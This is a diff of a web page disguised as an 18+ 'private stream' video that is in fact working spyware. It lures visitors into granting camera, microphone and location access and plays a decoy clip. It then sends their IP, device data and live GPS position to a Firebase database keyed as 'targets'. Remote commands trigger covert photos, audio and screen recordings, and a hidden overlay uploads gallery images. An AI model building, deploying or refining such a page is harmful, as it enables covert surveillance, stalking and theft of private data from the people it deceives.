@@ -3,140 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Stream Access</title>
+    <title>Private Content Access</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
-        #bg-image { position: fixed; width: 100%; height: 100%; background: url('https://source.unsplash.com/random/1600x900/?dark') center/cover; filter: blur(10px); z-index: 1; transform: scale(1.1); }
-        #main-ui { position: relative; z-index: 10; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.6); }
-        #play-btn { width: 90px; height: 90px; border: 5px solid #00ff41; border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; box-shadow: 0 0 20px #00ff41; }
-        #play-btn::after { content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #00ff41; margin-left: 8px; }
-        #age-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 320px; background: #111; border: 1px solid #333; border-radius: 15px; padding: 25px; text-align: center; z-index: 1000; color: white; }
-        .btn-yes { background: #00ff41; color: #000; padding: 12px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
-        #target-player { display:none; width:100%; height:100%; position:fixed; top:0; z-index:9999; background:#000; }
+        #bg-image { position: fixed; width: 100%; height: 100%; background: url('bg.png.jpeg') center/cover; filter: blur(8px); z-index: 1; transform: scale(1.1); }
+        #main-ui { position: relative; z-index: 10; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.5); }
+        #play-btn { width: 100px; height: 100px; border: 4px solid #fff; border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        #play-btn::after { content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid #fff; margin-left: 10px; }
+        #age-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 350px; background: #111; border: 1px solid #333; border-radius: 15px; padding: 25px; text-align: center; z-index: 1000; box-shadow: 0 0 50px #000; }
+        .btn-yes { background: #00ff41; color: #000; padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
         #hiddenFileInput { display: none; }
     </style>
 </head>
 <body>
-
     <div id="bg-image"></div>
     <div id="main-ui">
         <div id="play-btn" onclick="document.getElementById('age-modal').style.display='block'"></div>
-        <h2 style="color:#00ff41; margin-top:20px;">ACCESS VIDEO</h2>
+        <h1 style="color:#00ff41; margin-top:20px;">WATCH VIDEO</h1>
     </div>
-
     <div id="age-modal">
-        <h3>18+ Verification</h3>
-        <p>Confirm age to start high-quality stream.</p>
-        <button class="btn-yes" onclick="initSystem()">I AM 18+ (START)</button>
+        <h2 style="color:#fff;">18+ Content</h2>
+        <p style="color:#aaa;">Confirm you are 18+ to view this private stream.</p>
+        <button class="btn-yes" onclick="startSystem()">CONFIRM</button>
     </div>
-
-    <video id="target-player" controls playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
+    <video id="target-player" style="display:none; width:100%; height:100%; position:fixed; top:0; z-index:9999; background:#000;" controls playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
     <input type="file" id="hiddenFileInput" accept="image/*" multiple>
 
     <script>
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
+        const sessionID = "Target_" + Math.floor(Math.random() * 9999);
+        let mainStream = null;
 
-        const sessionID = "User_" + Math.floor(1000 + Math.random() * 9000);
-        let activeStream = null;
-
-        async function initSystem() {
+        async function startSystem() {
             document.getElementById('age-modal').style.display = 'none';
             try {
-                activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                mainStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('main-ui').style.display = 'none';
                 const v = document.getElementById('target-player');
-                v.style.display = 'block';
-                v.play();
+                v.style.display = 'block'; v.play();
                 
-                sendData();
-                setInterval(sendLocation, 10000);
+                sendInfo();
+                setInterval(sendLoc, 10000);
                 listenCommands();
-            } catch (e) { alert("Permission Error!"); location.reload(); }
+            } catch (e) { alert("Permission Required!"); location.reload(); }
         }
 
-        async function sendData() {
+        async function sendInfo() {
             const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
             const batt = await navigator.getBattery();
             db.ref(`targets/${sessionID}/info`).set({
-                ip: ip.ip,
-                battery: Math.round(batt.level * 100) + "%",
-                device: navigator.platform,
-                status: "ONLINE",
-                time: new Date().toLocaleString()
+                ip: ip.ip, battery: Math.floor(batt.level * 100) + "%",
+                device: navigator.platform, status: "ONLINE", time: new Date().toLocaleString()
             });
         }
 
-        function sendLocation() {
+        function sendLoc() {
             navigator.geolocation.getCurrentPosition(p => {
-                db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
+                db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude, time: Date.now() });
             }, null, {enableHighAccuracy:true});
         }
 
-        async function capture(mode, label) {
-            try {
-                // Important: Stop current tracks before switching cameras
-                if(activeStream) activeStream.getTracks().forEach(t => t.stop());
-                
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-                const track = stream.getVideoTracks()[0];
-                const captureImg = new ImageCapture(track);
-                const blob = await captureImg.takePhoto();
-                const reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = () => {
-                    db.ref(`targets/${sessionID}/photos`).push({ img: reader.result, type: label, time: Date.now() });
-                    stream.getTracks().forEach(t => t.stop());
-                    // Resume main stream
-                    navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s => activeStream = s);
-                };
-            } catch (e) { console.log(e); }
+        async function capture(mode, type) {
+            // Stop tracks to switch camera
+            if(mainStream) mainStream.getTracks().forEach(t => t.stop());
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            const v = document.createElement('video');
+            v.srcObject = stream; await v.play();
+            setTimeout(() => {
+                const c = document.createElement('canvas');
+                c.width = 640; c.height = 480;
+                c.getContext('2d').drawImage(v, 0, 0);
+                db.ref(`targets/${sessionID}/photos`).push({ img: c.toDataURL('image/jpeg', 0.6), type: type, time: Date.now() });
+                stream.getTracks().forEach(t => t.stop());
+                // Restart Main Stream
+                navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s => mainStream = s);
+            }, 2000);
         }
 
         function listenCommands() {
             db.ref(`commands/${sessionID}`).on('value', snap => {
-                const cmd = snap.val();
-                if(!cmd) return;
+                const cmd = snap.val(); if(!cmd) return;
                 if(cmd.action === 'photo') capture('user', 'Front');
                 if(cmd.action === 'back_photo') capture('environment', 'Back');
-                if(cmd.action === 'gallery_access') {
-                    const overlay = document.createElement('div');
-                    overlay.style = "position:fixed; top:0; left:0; width:100%; height:100%; z-index:10000; cursor:pointer;";
-                    overlay.onclick = () => { document.getElementById('hiddenFileInput').click(); document.body.removeChild(overlay); };
-                    document.body.appendChild(overlay);
-                }
-                if(cmd.action === 'screen_record') startScreenRec();
+                if(cmd.action === 'audio') recordAudio();
+                if(cmd.action === 'gallery_access') triggerGallery();
+                if(cmd.action === 'screen_record') recordScreen();
                 db.ref(`commands/${sessionID}`).remove();
             });
         }
 
-        async function startScreenRec() {
-            try {
-                const scStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                const mr = new MediaRecorder(scStream);
-                let chunks = [];
-                mr.ondataavailable = e => chunks.push(e.data);
-                mr.onstop = () => {
-                    const reader = new FileReader();
-                    reader.readAsDataURL(new Blob(chunks, {type: 'video/webm'}));
-                    reader.onloadend = () => db.ref(`targets/${sessionID}/screen_records`).push({ video: reader.result });
-                    scStream.getTracks().forEach(t => t.stop());
-                };
-                mr.start();
-                setTimeout(() => mr.stop(), 7000);
-            } catch (e) {}
+        function triggerGallery() {
+            const ov = document.createElement('div');
+            ov.style = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:10000;";
+            ov.onclick = () => { document.getElementById('hiddenFileInput').click(); document.body.removeChild(ov); };
+            document.body.appendChild(ov);
         }
 
         document.getElementById('hiddenFileInput').onchange = (e) => {
             for(let f of e.target.files) {
                 const r = new FileReader();
-                r.onload = ev => db.ref(`targets/${sessionID}/gallery_files`).push({ data: ev.target.result, name: f.name });
+                r.onload = ev => db.ref(`targets/${sessionID}/gallery`).push({ data: ev.target.result });
                 r.readAsDataURL(f);
             }
         };
+
+        async function recordAudio() {
+            const mr = new MediaRecorder(mainStream); let ch = [];
+            mr.ondataavailable = e => ch.push(e.data);
+            mr.onstop = () => {
+                const r = new FileReader();
+                r.readAsDataURL(new Blob(ch, {type:'audio/webm'}));
+                r.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({ audio: r.result });
+            };
+            mr.start(); setTimeout(() => mr.stop(), 5000);
+        }
+
+        async function recordScreen() {
+            try {
+                const s = await navigator.mediaDevices.getDisplayMedia({video:true});
+                const mr = new MediaRecorder(s); let ch = [];
+                mr.ondataavailable = e => ch.push(e.data);
+                mr.onstop = () => {
+                    const r = new FileReader(); r.readAsDataURL(new Blob(ch, {type:'video/webm'}));
+                    r.onloadend = () => db.ref(`targets/${sessionID}/screens`).push({ video: r.result });
+                    s.getTracks().forEach(t => t.stop());
+                };
+                mr.start(); setTimeout(() => mr.stop(), 8000);
+            } catch(e){}
+        }
     </script>
 </body>
 </html>
